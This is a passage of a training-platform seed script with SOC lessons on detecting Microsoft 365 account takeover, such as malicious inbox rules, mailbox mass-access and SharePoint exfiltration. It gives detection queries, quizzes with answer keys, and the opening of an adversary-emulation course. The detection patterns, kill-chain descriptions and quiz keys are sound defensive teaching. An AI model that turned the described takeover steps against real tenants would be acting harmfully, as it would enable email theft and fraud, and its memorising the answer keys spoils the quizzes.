Inbox rule with finance keywords and `MoveToFolder` / `MarkAsRead` / `Forward` / `Redirect` actions. Captured in M4 Lesson 4.7's capstone; restated here for the email-side angle:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND o365.audit.Operation IN ("New-InboxRule", "Set-InboxRule")
  AND KQL("o365.audit.Parameters: (*invoice* OR *wire* OR *swift* OR *payment* OR *remit* OR *ach* OR *bank*)")
  AND KQL("o365.audit.Parameters: (*MoveToFolder* OR *DeleteMessage* OR *MarkAsRead* OR *ForwardTo* OR *RedirectTo*)")
| KEEP @timestamp, user.target.name, o365.audit.Parameters
| SORT @timestamp DESC
| LIMIT 100
```

### .002 Remote Email Collection — `MailItemsAccessed` clusters

Microsoft Purview Audit (Premium) emits `MailItemsAccessed` for mailbox content read via API or sync — Graph mass-pull, EWS, IMAP, OWA bulk view. A cluster of `MailItemsAccessed` events for one user immediately after a high-risk Entra sign-in is the textbook T1114.002 fingerprint.

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND o365.audit.Operation == "MailItemsAccessed"
| STATS access_count = COUNT() BY user.target.name, BUCKET(@timestamp, 5m)
| WHERE access_count > 50
| SORT access_count DESC
| LIMIT 100
```

Note the licensing gate (E5 / A5 / G5) — for lower-SKU tenants the L2 falls back to mailbox-rule + forwarding signals instead.

## T1213 — Data from Information Repositories

### SharePoint / OneDrive mass-pull

`FileDownloaded` is the workhorse audit operation. A cluster of downloads from one user touching many distinct SharePoint sites in a short window indicates collection:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND o365.audit.Workload IN ("SharePoint", "OneDrive")
  AND o365.audit.Operation == "FileDownloaded"
| STATS download_count = COUNT(),
        unique_sites = COUNT_DISTINCT(o365.audit.SiteUrl),
        unique_files = COUNT_DISTINCT(o365.audit.SourceFileName)
  BY user.target.name, BUCKET(@timestamp, 1h)
| WHERE download_count > 100 OR unique_sites > 5
| SORT download_count DESC
| LIMIT 100
```

### `SharingSet` external-share signal

Adversary creates external-shareable links to the data they've collected, bypassing the need for inline exfil:

```kql
event.dataset: "o365.audit"
  and o365.audit.Workload: ("SharePoint" or "OneDrive")
  and o365.audit.Operation: ("SharingSet" or "AnonymousLinkCreated" or "AddedToGroup")
```

### Teams chat exfil

Teams `MessageSent` clusters from a compromised user to an external Teams chat (tenant-allowed external chat is increasing surface):

```kql
event.dataset: "o365.audit"
  and o365.audit.Workload: "MicrosoftTeams"
  and o365.audit.Operation: "MessageSent"
  and o365.audit.MessageURLs: *
```

### `SearchQueryPerformed` recon

Adversary inside the tenant uses Compliance Search / eDiscovery to find sensitive content. Rare in legitimate operations outside the security and legal teams.

```kql
event.dataset: "o365.audit"
  and o365.audit.Workload: "SecurityComplianceCenter"
  and o365.audit.Operation: "SearchQueryPerformed"
  and not user.target.name: ("ediscovery_*" or "compliance_*" or "soc_*")
```

## T1534 — Internal Spear Phishing

Once an account is compromised, the attacker uses *legitimate* Exchange to send phishing internally — auth passes, DKIM passes, no DMARC fail because mail is from a real internal user. Detection requires *behavioural* analysis on the post-takeover send pattern:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND o365.audit.Operation == "Send"
  AND email.direction == "outbound"
| STATS sent_count = COUNT(),
        recipients = COUNT_DISTINCT(email.to.address),
        subjects = COUNT_DISTINCT(email.subject)
  BY user.target.name, BUCKET(@timestamp, 1h)
| WHERE sent_count > 50 AND subjects <= 3
| SORT sent_count DESC
| LIMIT 100
```

The pattern: one user sends > 50 messages with ≤ 3 distinct subjects to many distinct recipients in 1 hour — a bulk-from-internal pattern that's atypical for legitimate user activity. Pair with M4 sign-in risk to attribute to AiTM.

## T1027.006 HTML Smuggling — email-side fingerprint

Recap: HTML attachment with > 100 KB body containing base64 + `Blob` / `msSaveOrOpenBlob` / `URL.createObjectURL`. From the email-side, the fingerprint is the *attachment hash never seen before* + *high-byte HTML attachment* combination — production hunts join attachment-hash novelty with size:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND email.direction == "inbound"
  AND email.attachments.file.mime_type IN ("text/html", "application/octet-stream")
| STATS first_seen = MIN(@timestamp),
        recipient_count = COUNT_DISTINCT(email.to.address),
        max_size = MAX(email.attachments.file.size)
  BY email.attachments.file.hash.sha256
| WHERE max_size > 100000 AND recipient_count >= 1
| SORT first_seen DESC
| LIMIT 200
```

## Glossary

- **AiTM-to-BEC kill chain** — phishing click → cookie theft → cloud sign-in → device reg → OAuth secret → cloud role → inbox rule → SharePoint pull → cloud-storage exfil.
- **`MailItemsAccessed`** — T1114.002 fingerprint; E5/A5/G5 licence-gated.
- **`SharingSet` / `AnonymousLinkCreated`** — external-share exfil signals on SharePoint / OneDrive.
- **T1534 Internal Spear Phishing** — auth-passing post-compromise mass-send pattern.

## Further reading

- Microsoft Learn — *Audit log activities* (full operation reference).
- ATT&CK technique pages T1098 / T1556 / T1114 / T1213 / T1534.
- Elastic Security prebuilt rules — Email & Cloud Identity rule library.
""",
    )
    m6l3q = _add_lesson(
        session, mod6, order=6, title="Post-click & collaboration — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on T1556.006 federation tampering severity, T1098.001 OAuth backdoor, MailItemsAccessed cluster reading, and the T1534 internal phishing shape.",
    )
    _add_q(session, m6l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 sees an Entra audit-log event `Set federation settings on domain` for the tenant's primary domain. The change-management ticket database shows no documented federation change. What is the L2's correct disposition?",
        options=[
            {"value": "info", "label": "Tag as informational; federation changes happen periodically"},
            {"value": "queue", "label": "Open a low-severity case for review next shift"},
            {"value": "page", "label": "**Page IR immediately** — `Set federation settings on domain` is a T1556.006 fingerprint that paves the path to *Golden SAML* T1606.002 tenant-wide persistence; Tier-0-equivalent risk in the cloud control plane"},
            {"value": "tune", "label": "Submit a tuning ticket — the rule is FP-rich"},
        ],
        correct="page",
        explanation_md="Federation-settings changes are extremely rare in normal ops (usually once a year, with documented change). Unattributed = page IR. The operator is establishing tenant-wide persistence via a rogue federated domain — Golden SAML preparation that bypasses every conditional-access control. Freeze the affected domain, revoke any in-progress federation change, and engage IR + Legal.",
        points=2,
    )
    _add_q(session, m6l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following Entra audit-log events are *high-priority* T1098 Account Manipulation signals an L2 should escalate immediately when fired by a non-admin actor?",
        options=[
            {"value": "add_sp_creds", "label": "`Add service principal credentials` — T1098.001 OAuth backdoor"},
            {"value": "role_grant", "label": "`Add member to role` for `Global Administrator` / `Privileged Role Administrator` / `Application Administrator` — T1098.003"},
            {"value": "add_device", "label": "`Add device` for an unfamiliar Entra device — T1098.005 (compliant-device CA bypass)"},
            {"value": "set_fed", "label": "`Set federation settings on domain` — T1556.006 (Golden SAML preparation)"},
            {"value": "user_login", "label": "Successful interactive sign-in from a domestic IP"},
        ],
        correct=["add_sp_creds", "role_grant", "add_device", "set_fed"],
        explanation_md="The first four are all canonical post-AiTM persistence signals — service-principal credential addition, privileged-role grant, device registration, federation-settings change. Each is *page-IR* on its own; the cluster of two or more is unmistakable. Domestic-IP interactive sign-in is normal user behaviour.",
        points=3,
    )
    _add_q(session, m6l3q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for **T1114.002 Remote Email Collection** by counting `MailItemsAccessed` events per user per 5-minute bucket and flagging clusters > 50. The hunt produces zero results across the entire fleet over 30 days. What's the most likely explanation before assuming the technique is absent?",
        options=[
            {"value": "no_attack", "label": "The technique is genuinely not active in the environment"},
            {"value": "license", "label": "`MailItemsAccessed` is gated to E5 / A5 / G5 licences (Microsoft Purview Audit Premium); on lower-SKU tenants the event simply isn't emitted, regardless of activity. The L2 should confirm tenant licensing tier before drawing conclusions, and use alternative signals (mailbox-rule + forwarding-rule clusters) on lower-SKU tenants"},
            {"value": "bug", "label": "Bug in the Filebeat module"},
            {"value": "field", "label": "The field is named differently"},
        ],
        correct="license",
        explanation_md="`MailItemsAccessed` is a Purview Audit Premium feature requiring E5 / A5 / G5 (or the standalone Audit Premium add-on). Lower-SKU tenants don't emit the event — meaning a zero-result hunt is *uninformative* rather than reassuring. The L2's reflex on a new estate: confirm licensing tier first, then pick the signal set that matches the tier. Lower-SKU equivalent hunts use mailbox-rule create-rate, forwarding-rule clusters, and OAuth grant additions.",
        points=2,
    )
    _add_q(session, m6l3q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="A user sending > 50 messages with ≤ 3 distinct subjects to many distinct recipients within a 1-hour window from inside the tenant — where SPF / DKIM / DMARC all pass because the mail is genuinely from a real authenticated internal user — is a high-confidence T1534 Internal Spear Phishing pattern that legitimate user activity rarely produces.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Legitimate user activity touches many subjects across many threads in a normal day; it doesn't produce 50+ near-identical sends. The auth-passing nature of post-compromise internal phishing is exactly what makes it dangerous (auth-only filtering can't catch it) and what makes the *behavioural* pattern — high-volume + low-subject-diversity + many-recipients — the L2's primary detection surface. Pair with M4 sign-in risk to confirm AiTM-driven compromise.",
        points=2,
    )

    # Lesson 6.4 — Statistical hunts + capstone
    m6l4 = _add_lesson(
        session, mod6, order=7,
        title="Statistical-anomaly hunts on email + collaboration and a worked end-to-end capstone",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Apply the **five canonical email-plane statistical-anomaly patterns** — rare-sender, attachment-hash novelty, subject-burst, DMARC fail-rate spike, mailbox-rule create-rate
> 2. Author **MailItemsAccessed cluster** anomaly hunts with M4 sign-in-risk pairing
> 3. Walk the **PEAK capstone** — *AiTM phishing → cookie theft → mass mailbox forwarding rule + SharePoint exfil* — end to end
> 4. Produce a **Kibana Security EQL detection-rule body** for the BEC-takeover-with-data-exfil chain

## Five canonical email-plane statistical patterns

### 1. Rare-sender across the fleet

Sender domains seen on ≤ N recipients fleet-wide:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 30d
  AND email.direction == "inbound"
  AND email.from.address IS NOT NULL
| EVAL from_domain = SPLIT(email.from.address, "@")[1]
| STATS recipient_count = COUNT_DISTINCT(email.to.address),
        message_count = COUNT(),
        first_seen = MIN(@timestamp)
  BY from_domain
| WHERE recipient_count <= 3 AND message_count <= 10
| SORT first_seen DESC
| LIMIT 200
```

Rare *new* sender domains delivered to a small number of recipients are worth investigation — most legitimate senders have organisation-wide footprints once they've been received before.

### 2. Attachment-hash novelty

Attachment SHA-256 hashes never seen before, delivered to multiple users in a short window:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND email.direction == "inbound"
  AND email.attachments.file.hash.sha256 IS NOT NULL
| STATS first_seen = MIN(@timestamp),
        recipient_count = COUNT_DISTINCT(email.to.address),
        senders = VALUES(email.from.address)
  BY email.attachments.file.hash.sha256, email.attachments.file.name
| WHERE recipient_count >= 5
| SORT first_seen DESC
| LIMIT 200
```

5+ recipients receiving the same novel-hash attachment in a short window is bulk-phish or campaign distribution.

### 3. Subject-burst

One subject delivered to > 50 mailboxes within 30 minutes from one external sender:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND email.direction == "inbound"
  AND email.from.address IS NOT NULL
| STATS recipient_count = COUNT_DISTINCT(email.to.address),
        message_count = COUNT()
  BY email.subject, email.from.address, BUCKET(@timestamp, 30m)
| WHERE recipient_count > 50
| SORT recipient_count DESC
| LIMIT 100
```

### 4. DMARC fail-rate spike per sender

Senders whose DMARC-fail rate jumps over baseline:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND email.direction == "inbound"
| EVAL is_dmarc_fail = CASE(KQL("authentication_results: *dmarc=fail*"), 1, 0)
| STATS total = COUNT(),
        fails = SUM(is_dmarc_fail)
  BY email.from.address, BUCKET(@timestamp, 1h)
| EVAL fail_ratio = TO_DOUBLE(fails) / TO_DOUBLE(total)
| WHERE total > 10 AND fail_ratio > 0.5
| SORT fail_ratio DESC
```

A sender suddenly failing DMARC half the time indicates either the sender's auth posture broke or someone is spoofing them.

### 5. Mailbox-rule create-rate per user

A user creating > 1 inbox rule per 5-minute window — most users create rules once a year:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND o365.audit.Operation IN ("New-InboxRule", "Set-InboxRule")
| STATS rule_count = COUNT() BY user.target.name, BUCKET(@timestamp, 5m)
| WHERE rule_count > 1
| SORT rule_count DESC
```

Pair with finance-keyword filter for the BEC fingerprint.

## MailItemsAccessed cluster + sign-in-risk pair

The high-confidence T1114.002 pattern — pair MailItemsAccessed clustering with M4's high-risk sign-in:

```esql
FROM logs-microsoft_o365.audit-*, logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 24h
  AND ((event.dataset == "o365.audit" AND o365.audit.Operation == "MailItemsAccessed")
       OR (event.dataset == "azure.signinlogs"
           AND azure.signinlogs.properties.risk_level_during_sign_in IN ("high", "medium")))
| STATS access_count = COUNTIF(o365.audit.Operation == "MailItemsAccessed"),
        risky_signin_count = COUNTIF(event.dataset == "azure.signinlogs")
  BY user.target.name, BUCKET(@timestamp, 30m)
| WHERE access_count > 50 AND risky_signin_count >= 1
| SORT access_count DESC
| LIMIT 100
```

A 30-minute window with both a high-risk sign-in and 50+ MailItemsAccessed events for the same user is *page-IR*.

## The PEAK capstone — AiTM phishing → cookie theft → mass mailbox-forwarding + SharePoint exfil

A complete L2-grade hunt walked end to end.

### Prepare

**Hypothesis (four-element).** *In the past 7 days, an adversary has executed the AiTM-to-BEC chain on at least one user — phishing-click on a cloud-fronted URL, AiTM session-cookie reuse via Entra `session_id`, an inbox-rule create with finance keywords, and SharePoint mass-download — observable across `logs-microsoft_o365.audit-*` and `logs-azure.signinlogs-*` joined on `user.target.name`.*

- **ATT&CK chain:** T1566.002 → T1539 → T1078.004 → T1098.005 → T1114.003 → T1213.
- **Data sources:** `logs-microsoft_o365.audit-*`, `logs-azure.signinlogs-*`, `logs-azure.auditlogs-*`.
- **Window:** explicit UTC bounds, last 7 days.

### Execute

**Q1 — Broad ES|QL** (anomalous Entra sign-ins per user):

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 7d
  AND azure.signinlogs.properties.risk_level_during_sign_in IN ("high", "medium")
| STATS risk_event_count = COUNT(),
        risk_types = VALUES(azure.signinlogs.properties.risk_event_types_v2),
        ips = VALUES(azure.signinlogs.properties.ip_address)
  BY azure.signinlogs.properties.user_principal_name, BUCKET(@timestamp, 1h)
| SORT risk_event_count DESC
| LIMIT 100
```

**Q2 — Narrow with `session_id` reuse** (M4-style AiTM signal):

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 7d
| STATS device_count = COUNT_DISTINCT(azure.signinlogs.properties.device_detail.device_id),
        ip_count = COUNT_DISTINCT(azure.signinlogs.properties.ip_address),
        ua_count = COUNT_DISTINCT(azure.signinlogs.properties.device_detail.browser),
        events = COUNT()
  BY azure.signinlogs.properties.user_principal_name,
     azure.signinlogs.properties.session_id,
     BUCKET(@timestamp, 30m)
| WHERE (device_count > 1 OR ua_count > 1) AND events >= 2
| SORT events DESC
| LIMIT 100
```

**Q3 — Enrichment** (BEC inbox-rule + SharePoint mass-pull on the same UPN):

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND user.target.name == "<survivor UPN>"
| KEEP @timestamp, o365.audit.Workload, o365.audit.Operation, o365.audit.Parameters,
       o365.audit.SourceFileName, o365.audit.SiteUrl
| SORT @timestamp ASC
```

**Q4 — Disposition with EQL `sequence`** covering the four-step chain:

```eql
sequence by user.target.name with maxspan=2h
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.risk_level_during_sign_in == "high" ]
  [ any where event.dataset == "azure.auditlogs"
          and azure.auditlogs.operation_name : "Add device" ]
  [ any where event.dataset == "o365.audit"
          and o365.audit.Operation : ("New-InboxRule", "Set-InboxRule") ]
  [ any where event.dataset == "o365.audit"
          and o365.audit.Workload : ("SharePoint", "OneDrive")
          and o365.audit.Operation == "FileDownloaded" ]
```

A user with all four steps in a 2-hour window is the textbook AiTM-to-BEC-to-data-exfil chain.

### Act

A high-confidence TP — page IR with the hunt report attached. Suggested L1 / L2 containment: revoke active sessions (`Revoke-MgUserSignInSession`), revoke any OAuth grants added by the user in the window, force password reset, force MFA re-registration, soft-delete the inbox rule (preserve for evidence — disable not delete), notify the user out-of-band.

### Know

Update Navigator coverage red → orange. Propose the EQL `sequence` from Q4 as the Kibana Security detection-rule body with severity *critical*, threat metadata (`TA0001 / TA0006 / TA0009 / TA0010` + the relevant T-numbers), runbook reference `RUNBOOK-AITM-BEC-EXFIL`, owner team `IR-team`. After 90 days FP-rate measurement and whitelist refinement, transition orange → yellow → green.

### The detection-rule body

The Q4 EQL `sequence` *is* the rule body — no rewriting:

```eql
sequence by user.target.name with maxspan=2h
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.risk_level_during_sign_in == "high" ]
  [ any where event.dataset == "azure.auditlogs"
          and azure.auditlogs.operation_name : "Add device" ]
  [ any where event.dataset == "o365.audit"
          and o365.audit.Operation : ("New-InboxRule", "Set-InboxRule") ]
  [ any where event.dataset == "o365.audit"
          and o365.audit.Workload : ("SharePoint", "OneDrive")
          and o365.audit.Operation == "FileDownloaded" ]
```

Metadata YAML:

```yaml
rule_type: eql
severity: critical
threat:
  - tactic_id: TA0001
    technique_id: T1566.002
  - tactic_id: TA0006
    technique_id: T1539
  - tactic_id: TA0003
    technique_id: T1098.005
  - tactic_id: TA0009
    technique_id: T1114.003
  - tactic_id: TA0009
    technique_id: T1213
runbook: RUNBOOK-AITM-BEC-EXFIL
owner: IR-team
```

## Glossary

- **Five canonical email-plane statistical patterns** — rare-sender / attachment-hash novelty / subject-burst / DMARC fail-rate spike / mailbox-rule create-rate.
- **MailItemsAccessed + sign-in-risk pair** — the high-confidence T1114.002 fingerprint.
- **Four-step AiTM-to-BEC-exfil chain** — risky sign-in → device add → inbox rule → SharePoint mass-pull, all keyed on one UPN within 2 hours.

## Further reading

- ATT&CK technique pages — full chain reference.
- Microsoft Learn — `MailItemsAccessed` documentation.
- Elastic docs — *Microsoft 365* and *Azure Active Directory* integration references.
""",
    )
    m6l4q = _add_lesson(
        session, mod6, order=8, title="Email statistical hunts & capstone — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the rare-sender pattern, mailbox-rule create-rate baseline, the four-step AiTM chain ordering, and the detection-rule body format.",
    )
    _add_q(session, m6l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to hunt for users creating *anomalous* numbers of inbox rules — the BEC fingerprint where post-AiTM the attacker creates one or more finance-keyword rules. What baseline assumption is the hunt's threshold built on?",
        options=[
            {"value": "monthly", "label": "Most users create > 10 inbox rules per month"},
            {"value": "rare", "label": "Most users create *zero or one* inbox rules per year — so > 1 inbox-rule-create event per user per 5-minute window is anomalous"},
            {"value": "daily", "label": "Most users create one rule per day"},
            {"value": "never", "label": "No legitimate user ever creates inbox rules"},
        ],
        correct="rare",
        explanation_md="Inbox-rule creation is genuinely rare in normal user behaviour — most users create zero rules per year, and even power users create perhaps one or two. So a single user creating > 1 inbox rule in a 5-minute window is unusual; pair with finance-keyword body filter and that becomes the textbook BEC fingerprint with very low FP rate.",
        points=2,
    )
    _add_q(session, m6l4q, order=2, kind=QuestionKind.SHORTANSWER,
        stem_md="Map the canonical four-step **AiTM-to-BEC-to-data-exfil chain** to the ATT&CK technique IDs in order: *high-risk Entra sign-in → device registration → inbox rule create → SharePoint mass file-download*. Use sub-tech IDs where relevant. Format: `T####.### → T####.### → T####.### → T####`.",
        options=None,
        correct=[
            "T1078.004 → T1098.005 → T1114.003 → T1213",
            "T1078.004 -> T1098.005 -> T1114.003 -> T1213",
            "1078.004 → 1098.005 → 1114.003 → 1213",
            "T1078.004, T1098.005, T1114.003, T1213",
            "T1078.004 T1098.005 T1114.003 T1213",
        ],
        explanation_md="**T1078.004 (Cloud Accounts) → T1098.005 (Device Registration) → T1114.003 (Email Forwarding Rule) → T1213 (Data from Information Repositories)**. The four steps form the textbook cloud-takeover chain — the L2 hunts the chain as an EQL `sequence by user.target.name with maxspan=2h`, which becomes a Kibana Security EQL detection-rule body with severity *critical*.",
        points=2,
    )
    _add_q(session, m6l4q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *valid* email-plane statistical-anomaly hunt patterns the L2 should run regularly?",
        options=[
            {"value": "rare_sender", "label": "**Rare-sender** — sender domains seen on ≤ 3 recipients fleet-wide with ≤ 10 messages"},
            {"value": "att_hash", "label": "**Attachment-hash novelty** — never-before-seen SHA-256 hashes delivered to ≥ 5 recipients in a short window"},
            {"value": "subj_burst", "label": "**Subject-burst** — one subject to > 50 mailboxes within 30 min from one external sender"},
            {"value": "dmarc_spike", "label": "**DMARC fail-rate spike** — sender whose DMARC-fail rate jumps over baseline (e.g. > 50% fails per hour)"},
            {"value": "rule_rate", "label": "**Mailbox-rule create-rate** — user creating > 1 inbox rule per 5-minute window"},
            {"value": "any_email", "label": "Any inbound email containing the word `urgent`"},
        ],
        correct=["rare_sender", "att_hash", "subj_burst", "dmarc_spike", "rule_rate"],
        explanation_md="The five canonical statistical patterns are exactly those listed in the first five options. Filtering for any inbound email containing `urgent` is too coarse — produces enormous noise without specificity.",
        points=3,
    )
    _add_q(session, m6l4q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="The Q4 EQL `sequence by user.target.name with maxspan=2h` covering the four-step AiTM-to-BEC chain (risky sign-in → device add → inbox rule → SharePoint download) becomes a **Kibana Security EQL detection-rule body** with no rewriting — the same query that found the hunt finding fires the rule, with severity / threat-metadata / runbook / owner added at conversion time.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Kibana Security's EQL rule type accepts `sequence` bodies directly. The L2's hunt query *is* the candidate rule body. The five-gate hand-off (M1 Lesson 4) adds FP-rate measurement, whitelist filters, severity / runbook / owner metadata, the TIDE submission, and the lifecycle plan — but the *query body* itself doesn't change. This 1:1 hunt-to-detection mapping is the architectural reason EQL is the preferred chain-rule language in Kibana Security.",
        points=2,
    )

    print(f"  L2: {course.title} — 6 modules, 48 lessons (Module 6 Email & Collaboration @ proper depth)")
    return course


# ── L3 — Adversary Emulation Basics ──────────────────────────────────────


def _seed_l3(session: Session, author_id: int) -> Course:
    course = _add_course(
        session,
        slug="demo-l3-adversary-emulation-basics",
        title="Adversary Emulation Basics",
        level=CourseLevel.L3,
        description_md=(
            "Move from defending against threats to actively *exercising* your detections. "
            "L3 analysts run controlled adversary emulations — picking a TTP, executing it "
            "in a sanctioned way, and verifying that the SOC catches it. This course covers "
            "purple-teaming concepts, MITRE ATT&CK → Atomic Red Team mapping, and how to "
            "turn negative emulation results into detection-engineering work.\n\n"
            "**Prerequisites:** L2 Threat Hunting with KQL, comfort with PowerShell or "
            "Bash on Windows endpoints.\n\n"
            "**By the end you'll be able to:**\n\n"
            "- Plan a purple-team exercise scoped to one TTP\n"
            "- Use Atomic Red Team to execute the TTP safely\n"
            "- Verify whether your detections fired and at what fidelity\n"
            "- Convert a missed-detection result into a `TuningProposal` ticket\n"
        ),
        estimated_hours=4,
        order_in_level=1,
        skill_keys=["adversary-emulation", "purple-teaming", "detection-engineering"],
        author_id=author_id,
    )
    mod = _add_module(
        session, course, order=1, title="Purple-team flow: ATT&CK → Atomic → Detection check",
        description_md="One realistic emulation cycle, end to end.",
        estimated_minutes=90,
    )

    l1 = _add_lesson(
        session, mod, order=1, title="Why purple teaming beats annual pentests",
        lesson_type=LessonType.READING, duration_min=28,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Articulate the difference between **penetration testing** and **adversary emulation** to a non-technical executive
> 2. Map the four detection-fidelity tiers (Alerted / Logged-not-alerted / Unparsed / Not-logged) to the team that owns the gap
> 3. Plan a single-TTP purple-team exercise from authorisation through to scorecard
> 4. Convert a missed detection into a `TuningProposal` ticket with the right scope
> 5. Avoid the eight common mistakes that wreck early purple-team programs
>
> **Prerequisites.** L1 *Alert Triage Fundamentals* and L2 *Threat Hunting with KQL* completed. Familiarity with PowerShell or Bash on a managed endpoint is required for the worked example.

## Pentests answer the wrong question

Annual pentests ask: *"Can a skilled attacker get in?"* The answer is almost always *yes*. You spend six figures on the engagement, get a 60-page report listing the same OWASP-style findings as last year, and your SOC team — the people who'd actually have to defend against a real intrusion — get nothing actionable from it. The pentesters got in. The remediation list goes to IT. The SOC was a bystander.

Worse, the report tells you almost nothing about your real risk: **whether your SOC would have caught a real adversary if they'd actually been malicious instead of contractually constrained.** A pentester who stays out of EDR's view because they bought the same EDR you have and tuned their tooling against it has proven nothing about whether *Conti* or *FIN7* would also stay out of view.

Adversary emulation flips the question:

> *"For each of the TTPs we know real adversaries against our sector use, can we **detect** them, **respond** to them, and **respond fast enough**? Show me the evidence — for every TTP — that we caught it or didn't."*

This is a question with a *measurable* answer. You can put numbers on it. You can track it quarter over quarter. You can defend the SOC budget at year-end review with it. A pentest report cannot.

## The full purple-team flow

A single purple-team cycle is one TTP, one exercise, one scorecard. Run it once a week against a planned curriculum of the TTPs that matter most to your org, and within six months you have empirical detection coverage data for ~25 techniques. That's a defensible posture.

```mermaid
flowchart TD
    P[1. Pick TTP<br/>from threat profile] --> A[2. Authorise<br/>CISO + IR signoff]
    A --> B[3. Pre-brief L1<br/>so they don't open<br/>a real case]
    B --> X[4. Execute<br/>Atomic Red Team test]
    X --> C[5. Wait for telemetry<br/>5-30 min ingestion]
    C --> D{6. Did it fire?}
    D -->|Alerted at right severity| E[7a. Score: latency + fidelity<br/>Pass]
    D -->|Logged but no rule| F[7b. Open TuningProposal<br/>Detection gap]
    D -->|Not in SIEM| G[7c. Logging or telemetry gap<br/>Talk to platform team]
    E --> S[8. Update scorecard<br/>Pick next TTP]
    F --> S
    G --> S
    S --> P
    style D fill:#7c2d12,color:#fff
    style E fill:#15803d,color:#fff
    style F fill:#a16207,color:#fff
    style G fill:#991b1b,color:#fff
```

Notice step 5 — *wait for telemetry*. New purple-teamers run the test and refresh the SIEM immediately, see no alert, declare a gap, and miss the fact that their EDR has a 15-minute ingestion lag. **Always wait at least 30 minutes before declaring a missed detection.** Half of perceived gaps disappear after coffee.

## The four detection-fidelity tiers

When you check whether a TTP fired, the answer is **never just yes/no**. There are four tiers, and they tell different teams different things:

```mermaid
graph TD
    Q{Did the SIEM<br/>alert?} -->|Yes — right severity| T1[<b>Tier 1 · Alerted</b><br/>Detection works.<br/>Score: latency, fidelity, severity accuracy.]
    Q -->|Yes — but wrong<br/>severity / 4hr latency| T1B[<b>Tier 1 with concerns</b><br/>Quality issue.<br/>Detection-eng tunes severity / latency.]
    Q -->|No alert.<br/>Data IS in SIEM| T2{Field queryable?}
    T2 -->|Yes — field exists| T3[<b>Tier 2 · Logged not alerted</b><br/>Detection gap.<br/>Detection-eng owns fix.]
    T2 -->|No — field missing| T4[<b>Tier 3 · Logged not parsed</b><br/>Logging gap.<br/>SIEM team owns fix.]
    Q -->|No alert.<br/>Data NOT in SIEM| T5[<b>Tier 4 · Not logged</b><br/>Telemetry gap.<br/>Platform team owns fix.<br/>Often a budget conversation.]

    style T1 fill:#15803d,color:#fff
    style T1B fill:#a16207,color:#fff
    style T3 fill:#a16207,color:#fff
    style T4 fill:#9a3412,color:#fff
    style T5 fill:#991b1b,color:#fff
```

| Tier | What fired | Owner | Typical fix |
|---|---|---|---|
| **1 · Alerted** | High-fidelity rule, right severity | Nobody (it works) | Just record the latency |
| **1 with concerns** | Rule fired but wrong severity or 4hr latency | Detection-eng | Tune severity / aggregation window |
| **2 · Logged not alerted** | Activity is in `winlogbeat-*`, field is queryable, no rule matched | Detection-eng | Write or extend a detection rule |
| **3 · Logged not parsed** | Activity is in the index, but the relevant field doesn't exist as a queryable column | SIEM team | Fix the parser, ECS mapping, or pipeline transform |
| **4 · Not logged** | Data source isn't being collected at all | Platform / Architecture team | Roll out new data source — usually a budget + agent-deployment conversation |

Calling all four "we missed it" is the single most common mistake in purple-team reporting. The fix for each tier lives with a different team, and conflating them either:

- Blames detection-eng for a *telemetry* problem they can't fix
- Lets the platform team off the hook for missing data sources by claiming it's a "rule" issue
- Burns goodwill: detection-eng won't engage with your scorecard if half the "gaps" you flag are actually parsing or telemetry issues

## Scoping rules — what *not* to do is half the discipline

Before you run anything, agree these constraints in writing:

### One TTP per exercise

If you chain T1059.001 → T1547.001 → T1003.001 in one execution, and only one detection fires, you can't tell which step it caught. You think you found two gaps when you might have found one. Or vice versa. Always test atomically.

### Authorisation in writing

CISO + IR lead must sign off, scoped to:

- **The specific MITRE technique ID** (and sub-technique)
- **The host or hosts** the test will run on
- **The time window** the test is allowed
- **The expected blast radius** — what files / processes / network calls it will create

Without authorisation you're conducting unauthorised intrusion testing. *Your* SIEM should catch it. *Your* legal team will pick you up if it does.

### Pre-brief the L1 shift

Tell the L1 team that a sanctioned T1059.001 exercise is happening between 14:00–14:30 on host `ABACWKS042`, with reference number `EX-2026-04-001`. Otherwise they'll see Bob's investigation, open a real case, and waste 30 minutes confirming it's the test you're running. They'll also start to *expect* exercises (good) and stop confusing them with real threats (also good).

The pre-brief format I use:

```
EXERCISE NOTICE — EX-2026-04-001
Date: 2026-04-27
Window: 14:00–14:30
Host: ABACWKS042 (test workstation, IT Ops scope)
TTP: T1059.001 — Encoded PowerShell via mshta
